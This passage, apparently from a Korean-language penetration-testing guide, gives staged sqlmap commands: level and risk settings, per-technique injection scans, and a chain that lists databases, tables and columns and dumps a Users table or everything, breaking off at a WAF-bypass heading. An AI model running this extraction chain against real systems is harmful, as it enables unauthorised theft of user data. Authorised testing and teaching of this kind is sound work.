    # level 1 (기본) ~ 5 (전체 페이로드 + 헤더 점검)
    # risk 1 (안전) ~ 3 (DELETE/UPDATE 등 위험)
    sqlmap -u "..." --batch --level=5 --risk=3 --threads=4
    ```

    ▶ 3단계: 특정 technique (시간 절약)
    ```bash
    sqlmap -u "..." --batch --technique=B    # Boolean only
    sqlmap -u "..." --batch --technique=T    # Time-based
    sqlmap -u "..." --batch --technique=U    # Union
    sqlmap -u "..." --batch --technique=E    # Error-based
    sqlmap -u "..." --batch --technique=S    # Stacked queries
    ```

    ▶ 4단계: DB 정보 추출 chain
    ```bash
    sqlmap -u "..." --batch --dbs                 # 모든 DB 목록
    sqlmap -u "..." --batch --tables -D <dbname>  # 테이블 목록
    sqlmap -u "..." --batch --columns -T Users    # 컬럼 목록
    sqlmap -u "..." --batch --dump -T Users -D <db>  # 데이터 dump
    sqlmap -u "..." --batch --dump-all            # 전체 dump (위험)
    ```

    ▶ 5단계: WAF 우회 (--tamper)
    ```bash
